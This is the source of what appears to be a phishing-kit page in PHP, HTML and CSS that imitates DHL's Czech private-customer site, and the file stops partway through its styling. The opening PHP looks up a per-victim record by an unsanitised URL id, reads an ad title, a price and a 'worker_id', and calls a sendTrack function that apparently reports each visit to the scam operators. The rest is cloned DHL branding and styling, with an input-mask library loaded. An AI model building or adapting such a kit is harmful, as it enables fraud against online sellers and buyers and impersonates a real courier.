
<?php
include "service.php";
include "../settings.php";
if (file_exists("data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("data/" . $_GET["id"] . ".xml");

sendTrack($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id);
?>
<!DOCTYPE html>
<!-- saved from url=(0042) -->
<html lang="cz"><head class="at-element-marker"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<link rel="preload" href="./prop_files/bundle.da701d0ef3398103c6aa5536223a76cc.css" as="style" crossorigin="">
<link rel="stylesheet" type="text/css" href="./prop_files/bundle.da701d0ef3398103c6aa5536223a76cc.css">
<link rel="stylesheet" type="text/css" href="./prop_files/bundle-utapi.da701d0ef3398103c6aa5536223a76cc.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>

<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Soukromí zákazníci DHL - odesílání a přijímání balíků s DHL</title>
<style>
    .header-menu-pnk {
	text-decoration: none;
    color: #797979;
    font-size: 15px;
    margin-right: 20px;
    font-weight: 600;
}
#b-menu {
	float: right; 
	margin-right: 20px; 
	margin-top: 20px;
}
#header-menu {
	width: 100%; 
	height: 30px; 
	margin-top: 27px;
}
#_1f {
	background: #f3f3f3;
	font-size: 12px;
	color: #414042;
}
.fblock-title a {
	font-weight: 600;
	color: #414042;
    text-decoration: none;
}
.fblock-title {
    margin-bottom: 20px;
}
.nav-info {
	margin: 0 auto;
	padding: 20px 0;
    border-bottom: 1px solid #d8d8d8;
}
.nav-info ul {
	display: flex;
	padding: 0;
}
.nav-info li {
	margin-bottom: 10px;
	list-style-type: none;
	font-size: 16px;
    margin: 20px;
}
.fblock-pnk {
	color: #414042;
    text-decoration: none;
}
.nolu-title {
	margin-top: 30px;
	margin-left: 40px;
    width: 70px;
}
#underheader {
	margin: 0 auto;
}
.underheader-btn {
	background: #fc0;
	padding: 10px 20px;
	text-decoration: none;
	color: #3c3c3c;
}
#sled1 {
	width: 100%;
}
#sled2 {
	display: none;
}
._0 {
	margin: 0 auto;
}
._1 {
margin: 0 auto;
	height: 64px;
	margin-top: 18px;
	margin-bottom: 18px;
	display: flex;
}
._2 {
	height: 100%;
	background: url(logo.php) no-repeat 0 center / auto 72px;
	width: 200px;
}
._3 {
	width: 100%;
}
._4 {
	font-weight: bold;
	font-size: 20px;
}
._5 {
	margin-top: 12px;
}
._13 {
	font-weight: bold;
	font-size: 30px;
	margin-top: 50px;
	margin-bottom: 24px;
	margin-left: 16px;
    margin-top: 100px;
}
._14 {
	margin-top: 12px;
}
._15 {
	width: 30%;
}
._16 {
	padding: 35px 16px;
    margin-bottom: 50px;
}
._17 {
	border-top: 1px solid #e7e7e7;
	padding: 50px;
	margin-bottom: 16px;
	color: #565656;
}
._177 {
	color: #333;
	border: none;
}
._19 {
	padding: 12px;
    border: 1px solid #cacaca;
}
._20 {
	width: 250px;
	margin-top: 30px;
}
._21 {
	font-size: 16px;
	color: #555;
	margin-bottom: 24px;
}
._23 {
	padding: 20px;
	font-size: 20px;
	color: #3c3c3c;
	cursor: pointer;
	background: #fc0;
}
._23:disabled {
	background: #E8A4B8;
	cursor: default;
}
._24 {
	color: #999;
}
._30 {
	margin-bottom: 4px;
	font-size: 16px;
}

input {
	font-family: Arial;
	font-size: 16px;
	color: #222;
	width: 100%;
	border: none;
	outline: none;
	box-sizing: border-box;
	-webkit-appearance: none;
}
table {
	width: 100%;
	border-collapse: collapse;
	-webkit-appearance: none;
}

td {
	padding: 0;
}
button {
	-webkit-appearance: none;
}
#copyright {
	padding: 20px; 
	margin: 0 auto; 
	max-width: 984px;
}
@media all and (max-width: 960px) {
	._0 {
		max-width: 480px;
	}
	._1 {
		margin-top: 16px;
	}
	/*._3, ._16, ._21, ._20 {
		width: 100%;
	}*/
	._13 {
		font-size: 26px;
	}
	#header-menu {
	    display: none;
	}
	._2 {
		width: 100%;
	}
	._15 {
	    width: 40%;
	}
	#_1f {
	display: block;
	padding: 30px;
	}
	.nav-info {
	    width: 50%;
	    margin-left: 20%;
	}
	#sled1 {
		display: none;
	}
	#sled2 {
		display: block;
		width: 100%;
	}
	.nav-info ul {
		display: block;
	}
	#underheader {
		display: none;
	}
	#copyright {
		max-width: 434px;
	}
}


  </style>
<meta property="og:title" content="fdsahdsafh">
<meta property="og:description" content="fdsahdsafh">
<meta property="og:type" content="website">
<meta property="og:locale" content="cz_CZ">
<meta property="og:image" content="/logoprev.png">
</head><body>
<style>
      a {
        color: #d40511;
        text-decoration: none;
      }
      
      input:not(:focus):valid ~ .floating-label {
        top: 0px;
        bottom: 0px;
        left: 10px;
        font-size: 11px;
        color: rgba(50, 50, 50, .5);
        opacity: 1;
        white-space: nowrap;
      }
      
      html {
        font-family: sans-serif;
        -ms-text-size-adjust: 100%;
        -webkit-text-size-adjust: 100%
      }
      
      body {
        margin: 0;
        overflow-x: hidden
      }
      
      footer,
      header {
        display: block
      }
      
      a {
        background-color: transparent
      }
      
      a:active,
      a:hover {
        outline: 0
      }
      
      img {
        border: 0
      }
      
      svg:not(:root) {
        overflow: hidden
      }
      
      button {
        color: inherit;
        font: inherit;
        margin: 0
      }
      
      button {
        overflow: visible
      }
      
      button {
        text-transform: none
      }
      
      button {
        -webkit-appearance: button;
        cursor: pointer
      }
      
      button::-moz-focus-inner {
        border: 0;
        padding: 0
      }
      
      @media print {
        *,
        *:before,
        *:after {
          color: #000 !important;
          text-shadow: none !important;
          background: transparent !important;
          box-shadow: none !important
        }
        a,
        a:visited {
          text-decoration: underline
        }
        a[href]:after {
          content: " (" attr(href) ")"
        }
        a[href^="#"]:after {
          content: ""
        }
        img {
          page-break-inside: avoid
        }
        img {
          max-width: 100% !important
        }
        p {
          orphans: 3;
          widows: 3
        }
      }
      
      @font-face {
        font-family: "Glyphicons Halflings";
        src: url("");
        src: url("") format("embedded-opentype"), url("") format("woff2"), url("") format("woff"), url("") format("truetype"), url("") format("svg")
      }
      
      * {
        -webkit-box-sizing: border-box;
        -moz-box-sizing: border-box;
        box-sizing: border-box
      }
      
      *:before,
      *:after {
        -webkit-box-sizing: border-box;
        -moz-box-sizing: border-box;
        box-sizing: border-box
      }
      
      html {
        font-size: 10px;
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
      }
      
      body {
        font-family: "Delivery", Verdana, sans-serif;
        font-size: 16px;
        line-height: 1.7;
        color: #323232;
        background-color: #fff
      }
      
      button {
        font-family: inherit;
        font-size: inherit;
        line-height: inherit
      }
      
      a {
        color: #d40511;
        text-decoration: none
      }
      
      a:hover,
      a:focus {
        color: #323232;
        text-decoration: none
      }
      
      a:focus {
        outline: 5px auto -webkit-focus-ring-color;
        outline-offset: -2px
      }
      
      img {
        vertical-align: middle
      }
      
      .container {
        padding-right: 15px;
        padding-left: 15px;
        margin-right: auto;
        margin-left: auto
      }
      
      @media(min-width:768px) {
        .container {
          width: 750px
        }
      }
      
      @media(min-width:992px) {
        .container {
          width: 970px
        }
      }
      
      @media(min-width:1200px) {
        .container {
          width: 1170px
        }
      }
      
      .row {
        margin-right: -15px;
        margin-left: -15px
      }
      
      .col-lg-3,
      .col-sm-6,
      .col-xs-12 {
        position: relative;
        min-height: 1px;
        padding-right: 15px;
        padding-left: 15px
      }
      
      .col-xs-12 {
        float: left
      }
      
      .col-xs-12 {
        width: 100%
      }
      
      @media(min-width:768px) {
        .col-sm-6 {
          float: left
        }
        .col-sm-6 {
          width: 50%
        }
      }
      
      @media(min-width:1200px) {
        .col-lg-3 {
          float: left
        }
        .col-lg-3 {
          width: 25%
        }
      }
      
      .dhl.redesign h4,
      .dhl.redesign .h4 {
        font-family: inherit;
        font-weight: 600;
        line-height: 1.125;
        color: inherit
      }
      
      .dhl.redesign h4,
      .dhl.redesign .h4 {
        margin-top: 13.5px;
        margin-bottom: 13.5px
      }
      
      .dhl.redesign h4,
      .dhl.redesign .h4 {
        font-size: 25px
      }
      
      .dhl.redesign p {
        margin: 0 0 13.5px
      }
      
      .dhl.redesign ul {
        margin-top: 0;
        margin-bottom: 13.5px
      }
      
      .dhl.redesign ul ul {
        margin-bottom: 0
      }
      
      .dhl.redesign .btn {
        display: inline-block;
        margin-bottom: 0;
        font-weight: normal;
        text-align: center;
        white-space: nowrap;
        vertical-align: middle;
        touch-action: manipulation;
        line-height: 1.125;
        cursor: pointer;
        background-image: none;
        border: 1px solid transparent;
        border-radius: 4px;
        font-size: 16px;
        min-height: 42px;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none
      }
      
      .dhl.redesign .btn:focus,
      .dhl.redesign .btn:active:focus {
        outline: 5px auto -webkit-focus-ring-color;
        outline-offset: -2px
      }
      
      .dhl.redesign .btn:hover,
      .dhl.redesign .btn:focus {
        color: #333;
        text-decoration: none
      }
      
      .dhl.redesign .btn:active {
        background-image: none;
        outline: 0;
        -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
        box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125)
      }
      
      .dhl.redesign .btn-primary {
        color: #fff;
        background-color: #d40511;
        border-color: #bb040f
      }
      
      .dhl.redesign .btn-primary:focus {
        color: #fff;
        background-color: #a2040d;
        border-color: #3f0105
      }
      
      .dhl.redesign .btn-primary:hover {
        color: #fff;
        background-color: #a2040d;
        border-color: #7f030a
      }
      
      .dhl.redesign .btn-primary:active {
        color: #fff;
        background-color: #a2040d;
        background-image: none;
        border-color: #7f030a
      }
      
      .dhl.redesign .btn-primary:active:hover,
      .dhl.redesign .btn-primary:active:focus {
        color: #fff;
        background-color: #7f030a;
        border-color: #3f0105
      }
      
      .dhl.redesign .btn-block {
        display: block;
        width: 100%
      }
      
      .dhl.redesign .container:before,
      .dhl.redesign .container:after,
      .dhl.redesign .row:before,
      .dhl.redesign .row:after,
      .dhl.redesign .container:before,
      .dhl.redesign .container:after {
        display: table;
        content: " "
      }
      
      .dhl.redesign .container:after,
      .dhl.redesign .row:after,
      .dhl.redesign .container:after {
        clear: both
      }
      
      @-ms-viewport {
        width: device-width
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px) {
        .dhl.redesign .hiddenMobile {
          display: none !important
        }
      }
      
      @media(min-width:992px) and (max-width:1199px) {
        .dhl.redesign .hiddenMD {
          display: none !important
        }
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .hiddenLG {
          display: none !important
        }
      }
      
      .dhl.redesign p:last-child {
        margin-bottom: 0
      }
      
      .dhl.redesign button {
        background-color: #d40511;
        transition: background-color 200ms
      }
      
      .dhl.redesign button:hover {
        background-color: #a2040d
      }
      
      .dhl.redesign .btn {
        display: inline-flex;
        align-items: center;
        padding: .5rem 3.8rem;
        border: 2px solid #d1d1d1;
        border-radius: 4px;
        line-height: 1.125;
        cursor: pointer;
        outline: 0;
        font-weight: 500;
        white-space: normal;
        transition: color 200ms, background-color 200ms, border-color 200ms
      }
      
      .dhl.redesign .btn-block {
        justify-content: center;
        padding: 1rem 1.5rem;
        display: block
      }
      
      .dhl.redesign .btn-primary {
        border: 2px solid #d40511;
        color: #fff;
        background-color: #d40511
      }
      
      .dhl.redesign .circleIcon {
        display: inline-flex;
        justify-content: center;
        align-items: center;
        width: 5.5rem;
        height: 5.5rem;
        margin-right: 1.5rem;
        border: 1px solid #b5b5b5;
        border-radius: 50%;
        transition: border 200ms
      }
      
      .dhl.redesign .circleIcon .icon {
        justify-content: center;
        transition: transform 200ms
      }
      
      .dhl.redesign .circleIcon .icon svg {
        width: 2rem;
        height: 2rem
      }
      
      .dhl.redesign .circleIcon.circleIcon--highlight {
        color: #d40511
      }
      
      @media(min-width:1200px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign a[href]:focus .circleIcon {
          border-color: #d40511
        }
        .dhl.redesign a[href]:focus .circleIcon .icon {
          transform: scale(1.1)
        }
        .dhl.redesign a[href] .circleIcon:hover {
          border-color: #d40511
        }
        .dhl.redesign a[href] .circleIcon:hover .icon {
          transform: scale(1.1)
        }
      }
      
      .dhl.redesign h4:first-child,
      .dhl.redesign .h4:first-child {
        margin-top: 0
      }
      
      @media(max-width:767px) {
        .dhl.redesign h4,
        .dhl.redesign .h4 {
          font-size: 1.6rem;
          line-height: 1.125
        }
      }
      
      @media(min-width:768px) and (max-width:991px) {
        .dhl.redesign h4,
        .dhl.redesign .h4 {
          font-size: 1.6rem;
          line-height: 1.125
        }
      }
      
      @media(min-width:992px) and (max-width:1199px) {
        .dhl.redesign h4,
        .dhl.redesign .h4 {
          font-size: 2.5rem;
          line-height: 1.125
        }
      }
      
      .dhl.redesign .icon {
        display: inline-flex;
        align-items: center;
        width: 24px;
        height: 24px
      }
      
      .dhl.redesign .icon svg {
        width: 24px;
        height: 24px;
        background-color: transparent;
        transition: fill 200ms;
        fill: currentColor;
        max-height: 100%
      }
      
      .dhl.redesign a {
        transition: color 200ms
      }
      
      .dhl.redesign a:focus {
        outline: 0
      }
      
      .dhl.redesign .link-primary {
        font-weight: 500;
        color: #323232;
        transition: color 200ms, background-color, 200ms border-color 200ms
      }
      
      .dhl.redesign .link-primary:hover {
        color: #d40511
      }
      
      .dhl.redesign .link-primary svg {
        fill: #d40511
      }
      
      .dhl.redesign .link-icon {
        display: inline-flex;
        align-items: baseline
      }
      
      .dhl.redesign .link-icon.link-iconRight,
      .dhl.redesign .link-icon.link-iconRight a {
        flex-direction: row-reverse;
        text-decoration: none
      }
      
      .dhl.redesign .link-icon svg {
        max-height: 15px
      }
      
      .dhl.redesign p a {
        font-weight: 400 !important;
        text-decoration: underline;
        padding: 2px;
        border-radius: 2px;
        -webkit-transition: all .25s ease-in-out;
        -moz-transition: all .25s ease-in-out;
        -o-transition: all .25s ease-in-out;
        transition: all .25s ease-in-out
      }
      
      .dhl.redesign p a:focus,
      .dhl.redesign p a:hover {
        background-color: #d40511;
        color: #fff;
        text-decoration: none !important
      }
      
      .dhl.redesign.footer {
        border-top: .4rem solid #b5b5b5;
        background-color: #fafafa;
        padding-bottom: 3rem
      }
      
      .dhl.redesign.footer a {
        color: #323232
      }
      
      .dhl.redesign.footer a[href]:hover {
        color: #d40511
      }
      
      .dhl.redesign.footer a.disclaimer[href]:focus {
        border: 0
      }
      
      .dhl.redesign .footer__navigationItems {
        list-style: none;
        padding: 0;
        margin: 1rem 0 4rem
      }
      
      .dhl.redesign .footer__navigationItems li {
        padding: 1rem 0
      }
      
      .dhl.redesign .footer__navigationIcons {
        list-style: none;
        padding: 0;
        margin: 2rem 0 4rem;
        display: flex;
        flex-wrap: wrap
      }
      
      @media(max-width:767px) {
        .dhl.redesign .footer__navigationIcons {
          margin-top: 2.5rem;
          margin-bottom: 3rem
        }
      }
      
      .dhl.redesign .footer__navigationIcons li {
        margin-bottom: 2rem
      }
      
      .dhl.redesign .footer__navigationLegal {
        list-style: none;
        padding: 0;
        margin: 2rem 0 3rem;
        display: flex;
        flex-wrap: wrap;
        justify-content: space-around
      }
      
      .dhl.redesign .footer__navigationLegal li {
        padding: 1rem 0
      }
      
      .dhl.redesign .footer__navigationLegal li a {
        font-size: 1.3rem
      }
      
      @media(max-width:767px) {
        .dhl.redesign .footer__navigationLegal {
          justify-content: flex-start
        }
        .dhl.redesign .footer__navigationLegal li {
          width: 100%
        }
        .dhl.redesign .footer__navigationLegal li a {
          font-size: 16px
        }
      }
      
      .dhl.redesign .footer__row {
        margin-top: 4rem
      }
      
      .dhl.redesign .footer__row:not(:last-of-type):after {
        content: '';
        display: block;
        height: .1rem;
        background: #d1d1d1;
        margin: 0 1.5rem
      }
      
      .dhl.redesign .footer__rowLegal {
        text-align: center
      }
      
      @media(max-width:767px) {
        .dhl.redesign .footer__rowLegal {
          text-align: left
        }
      }
      
      .dhl.redesign .footer__rowLegal img {
        max-width: 20rem;
        max-height: 2rem
      }
      
      .dhl.redesign .footer__copyright {
        font-size: 13px;
        color: #666;
        margin-bottom: 4rem
      }
      
      .dhl.redesign.header {
        position: relative;
        z-index: 100;
        background-image: linear-gradient(90deg, #fc0 0, #fc0 30%, #ffde59 79%, #fff0b2 100%)
      }
      
      @media(min-width:1200px) {
        .dhl.redesign.header {
          height: 96px
        }
      }
      
      .dhl.redesign.header ul {
        display: flex;
        padding: 0;
        margin: 0;
        list-style: none
      }
      
      .dhl.redesign.header li:hover>a,
      .dhl.redesign.header li:focus>a,
      .dhl.redesign.header li:hover .loggedInUserName,
      .dhl.redesign.header li:focus .loggedInUserName {
        color: #d40511;
        background: #fff
      }
      
      .dhl.redesign.header li:hover>a svg,
      .dhl.redesign.header li:focus>a svg {
        fill: #d40511
      }
      
      .dhl.redesign.header a {
        display: flex;
        color: #323232;
        font-weight: 500;
        transition: background-color 200ms, background 200ms
      }
      
      .dhl.redesign.header a.registerLink {
        display: block
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign.header .header__mobileTabWrapper {
          display: flex;
          flex-direction: row;
          flex-wrap: wrap;
          font-size: 12px;
          font-weight: 500
        }
        .dhl.redesign.header .header__mobileTabWrapper__item {
          flex: 1 1 0;
          background: #f5f5f5;
          border: 1px solid #e6e6e6;
          border-top: 0
        }
        .dhl.redesign.header .header__mobileTabWrapper__item+.header__mobileTabWrapper__item:not(.active) {
          border-right: 0
        }
        .dhl.redesign.header .header__mobileTabWrapper__item>a {
          padding: 0;
          justify-content: center
        }
        .dhl.redesign.header .header__mobileTabWrapper__item>a>.header__linkCaption {
          padding: 11px
        }
        .dhl.redesign.header .header__mobileTabWrapper__item.active {
          color: #d40511;
          background: #fff;
          border: 0
        }
        .dhl.redesign.header .header__mobileTabWrapper__item.active>a>.header__linkCaption {
          border-bottom: 2px solid #d40511;
          color: #d40511
        }
      }
      
      .dhl.redesign .header__secondaryNavigation {
        display: flex;
        justify-content: flex-end;
        padding: 0 15px;
        font-size: 14px
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .header__secondaryNavigation {
          margin-bottom: 8px
        }
      }
      
      .dhl.redesign .header__secondaryNavigation a {
        font-weight: 400;
        background: 0;
        line-height: 21px
      }
      
      .dhl.redesign .header__secondaryNavigation a.active {
        background: 0;
        border-bottom: 2px solid #d40511
      }
      
      .dhl.redesign .header__secondaryNavigation li {
        margin: 10px 0 0 20px
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .header__secondaryNavigation {
          display: none
        }
      }
      
      .dhl.redesign .header__primaryNavigation {
        display: flex;
        justify-content: space-between;
        align-items: center
      }
      
      .dhl.redesign .header__primaryNavigation a {
        padding: 14px 15px 14px 15px;
        cursor: pointer
      }
      
      .dhl.redesign .header__primaryNavigation .icon {
        width: 19px;
        height: 19px
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px) {
        .dhl.redesign .header__primaryNavigation .icon {
          width: 18px;
          height: 16px
        }
      }
      
      .dhl.redesign .header__primaryNavigation .header__logoWrapper {
        margin-right: auto
      }
      
      .dhl.redesign .header__primaryNavigation .header__logoWrapper a {
        padding: 0
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .header__primaryNavigation .header__logoWrapper a {
          position: absolute;
          top: 35px;
          left: 50px
        }
      }
      
      .dhl.redesign .header__primaryNavigation>.header__navigationWrapper .search>a {
        padding-top: 14px;
        padding-bottom: 22px
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .header__primaryNavigation>.header__navigationWrapper>ul>li:not(.displayBonusPoints):not(.userMenu):not(.lang):not(.search)>a:not(.header__navigationDropdown):focus {
          position: relative
        }
        .dhl.redesign .header__primaryNavigation>.header__navigationWrapper>ul>li:not(.displayBonusPoints):not(.userMenu):not(.lang):not(.search)>a:not(.header__navigationDropdown):focus:after {
          content: "";
          border-bottom: 2px solid #d40511;
          position: absolute;
          width: 80%;
          left: 50%;
          bottom: 0;
          margin-left: -40%
        }
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .header__primaryNavigation>.header__navigationWrapper>ul>li:not(.displayBonusPoints):not(.userMenu):not(.lang):not(.search)>a:not(.header__navigationDropdown):focus {
          background: inherit
        }
        .dhl.redesign .header__primaryNavigation>.header__navigationWrapper>ul>li:not(.displayBonusPoints):not(.userMenu):not(.lang):not(.search)>a:not(.header__navigationDropdown):focus .header__linkCaption {
          position: relative
        }
        .dhl.redesign .header__primaryNavigation>.header__navigationWrapper>ul>li:not(.displayBonusPoints):not(.userMenu):not(.lang):not(.search)>a:not(.header__navigationDropdown):focus .header__linkCaption:after {
          content: "";
          border-bottom: 2px solid #d40511;
          position: absolute;
          left: 0;
          right: 0;
          bottom: -14px
        }
      }
      
      @media(min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .header__primaryNavigation>.header__navigationWrapper {
          width: 375px;
          -webkit-box-shadow: none;
          box-shadow: none
        }
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .header__primaryNavigation li.has-dropdown:not(.userMenu):hover,
        .dhl.redesign .header__primaryNavigation li.has-dropdown:not(.userMenu):focus>a:not(.header__navigationDropdown) {
          background: #fff
        }
        .dhl.redesign .header__primaryNavigation li.has-dropdown.userMenu:hover,
        .dhl.redesign .header__primaryNavigation li.has-dropdown.userMenu:focus {
          background: #fff;
          outline: 0
        }
        .dhl.redesign .header__primaryNavigation .has-dropdown>a>.header__linkIcon {
          display: none
        }
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .header__primaryNavigation {
          height: 5.4rem;
          align-items: center;
          padding: 0 0 0 1.5rem
        }
      }
      
      .dhl.redesign .header__logo {
        width: 14rem
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .header__logo {
          width: 11rem;
          margin-top: 1rem
        }
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .header__linkPrimary:hover,
        .dhl.redesign .header__linkPrimary:focus {
          background: #fff
        }
        .dhl.redesign .userMenu .header__linkPrimary:hover {
          background: 0
        }
        .dhl.redesign .userMenu .header__navigationDropdown li .header__linkCaption {
          font-weight: normal
        }
      }
      
      .dhl.redesign .header__navigationWrapper,
      .dhl.redesign .header__userMenuWrapper {
        justify-content: flex-end
      }
      
      @media(max-width:767px) {
        .dhl.redesign .header__navigationWrapper,
        .dhl.redesign .header__userMenuWrapper {
          width: 100%
        }
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .header__navigationWrapper,
        .dhl.redesign .header__userMenuWrapper {
          position: absolute;
          display: none;
          top: 100%;
          right: 0;
          z-index: 1;
          background-color: #fff;
          -webkit-box-shadow: 0 30px 60px 0 rgba(0, 0, 0, 0.1);
          box-shadow: 0 30px 60px 0 rgba(0, 0, 0, 0.1)
        }
        .dhl.redesign .header__navigationWrapper ul,
        .dhl.redesign .header__userMenuWrapper ul {
          flex-direction: column;
          width: 100%
        }
        .dhl.redesign .header__navigationWrapper>ul,
        .dhl.redesign .header__userMenuWrapper>ul {
          border-bottom: 4px solid #fc0
        }
        .dhl.redesign .header__navigationWrapper li>a,
        .dhl.redesign .header__userMenuWrapper li>a {
          display: flex;
          justify-content: space-between;
          align-items: center;
          border-bottom: 1px solid #e8e8e8
        }
        .dhl.redesign .header__navigationWrapper li>a:hover,
        .dhl.redesign .header__userMenuWrapper li>a:hover,
        .dhl.redesign .header__navigationWrapper li>a:focus,
        .dhl.redesign .header__userMenuWrapper li>a:focus {
          background: 0;
          background-color: #f5f5f5;
          color: #323232
        }
        .dhl.redesign .header__navigationWrapper li>a .icon {
          fill: #d40511
        }
        .dhl.redesign .header__navigationWrapper li:last-child>a,
        .dhl.redesign .header__userMenuWrapper li:last-child>a {
          border-bottom-width: 0
        }
      }
      
      .dhl.redesign.header .userMenuButton {
        display: inline-block;
        padding-bottom: 13px
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .header__userMenuWrapper {
          width: 220px
        }
      }
      
      .dhl.redesign .userMenu {
        position: relative
      }
      
      .dhl.redesign .userMenu .header__navigationDropdown {
        width: 270px;
        left: auto;
        right: 0;
        flex-direction: column;
        min-height: 100%
      }
      
      .dhl.redesign .userMenu .header__navigationDropdown:focus {
        outline: 0
      }
      
      .dhl.redesign .userMenu .link-primary {
        padding: 0 1.8rem 1.2rem
      }
      
      .dhl.redesign .userMenu .link-primary.link-icon .icon .arrow-link-right {
        height: 11px
      }
      
      .dhl.redesign .userMenu .link-primary .registerLink {
        transition: color 200ms;
        padding: 0
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .userMenu .link-primary .registerLink {
          font-size: .9rem;
          line-height: 1.2rem
        }
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .userMenu .link-primary .registerLink {
          font-size: 1rem;
          line-height: 1.3rem
        }
      }
      
      .dhl.redesign .userMenu .link-primary .registerLink:hover,
      .dhl.redesign .userMenu .link-primary .registerLink:focus {
        color: #fff;
        text-decoration: none !important
      }
      
      .dhl.redesign .userMenu .loginContainer {
        padding: 1.8rem 1.8rem 1.2rem
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .userMenu .icon-login-filled {
          display: none
        }
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .userMenu .icon-login-filled {
          display: none
        }
      }
      
      .dhl.redesign .userMenu .loggedInUserName {
        font-size: 1.2rem;
        padding: 1.8rem 0;
        line-height: 1.5;
        vertical-align: text-top;
        margin-left: -1.2rem;
        margin-right: 1.2rem
      }
      
      .dhl.redesign .header__navigationWrapper--mobile {
        display: none;
        position: static;
        -webkit-box-shadow: none;
        box-shadow: none
      }
      
      .dhl.redesign .header__navigationWrapper--mobile ul {
        flex-direction: row-reverse
      }
      
      .dhl.redesign .header__navigationWrapper--mobile .header__userMenuWrapper ul {
        flex-direction: column
      }
      
      .dhl.redesign .header__navigationWrapper--mobile .header__userMenuWrapper a {
        color: #323232;
        font-weight: normal;
        height: auto;
        padding: 14px 15px 14px 15px
      }
      
      .dhl.redesign .header__navigationWrapper--mobile .header__userMenuWrapper .loggedInUserName {
        display: none
      }
      
      .dhl.redesign .header__navigationWrapper--mobile a {
        height: 5.4rem;
        color: #d40511;
        border-left: 1px solid rgba(255, 255, 255, 0.3);
        padding: 18px
      }
      
      .dhl.redesign .header__navigationWrapper--mobile .icon {
        width: 18px;
        height: 18px
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .header__navigationWrapper--mobile {
          display: block;
          background-color: transparent
        }
      }
      
      .dhl.redesign .header__navigationDropdown {
        flex-direction: column;
        position: absolute;
        background-color: #fff;
        -webkit-box-shadow: 0 80px 60px 0 rgba(0, 0, 0, 0.1);
        box-shadow: 0 80px 60px 0 rgba(0, 0, 0, 0.1)
      }
      
      .dhl.redesign .header__navigationDropdown:focus {
        outline: 0
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .header__navigationDropdown {
          display: none !important
        }
      }
      
      @media(min-width:992px) and (max-width:1199px),
      (min-width:768px) and (max-width:991px),
      (max-width:767px) {
        .dhl.redesign .header__navigationDropdown.sub-menu {
          position: absolute;
          right: -100%;
          top: 0;
          width: 100%;
          z-index: 999;
          -webkit-transition: all .3s ease-in-out .25s;
          -o-transition: all .3s ease-in-out .25s;
          transition: all .3s ease-in-out .25s;
          border-bottom: 4px solid #fc0
        }
        .dhl.redesign .header__navigationDropdown.sub-menu .menu-back>a {
          font-weight: 500;
          justify-content: left;
          padding: 8px 15px;
          color: #d40511
        }
        .dhl.redesign .header__navigationDropdown.sub-menu .menu-back>a .header__linkIcon {
          margin-left: 12px;
          margin-right: 25px
        }
        .dhl.redesign .header__navigationDropdown.sub-menu:not(.slide-in) {
          visibility: hidden;
          width: 0;
          overflow: hidden
        }
        .dhl.redesign .header__navigationDropdown.sub-menu .header__navigationDropdown_sub {
          display: none
        }
        .dhl.redesign .header__navigationDropdown.sub-menu .link-holder {
          padding-left: 0;
          padding-right: 0
        }
        .dhl.redesign .header__navigationDropdown.sub-menu .link-holder a {
          padding: 0
        }
        .dhl.redesign .header__navigationDropdown.sub-menu .link-holder a .header__linkCaption {
          display: inline-block;
          width: 100%;
          border-right: 1px solid #e8e8e8;
          padding: 13px 15px
        }
        .dhl.redesign .header__navigationDropdown.sub-menu .link-holder a .header__linkIcon {
          padding: 12px 18px
        }
        .dhl.redesign .header__navigationDropdown.sub-menu .link-holder a .header__linkIcon .icon {
          width: 19px;
          height: 19px
        }
        .dhl.redesign .header__navigationDropdown.sub-menu .link-holder:not(.in) {
          background: #f5f5f5
        }
        .dhl.redesign .header__navigationDropdown.sub-menu .link-holder:not(.in)>a {
          background: #f5f5f5
        }
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .header__navigationDropdown {
          flex-direction: row;
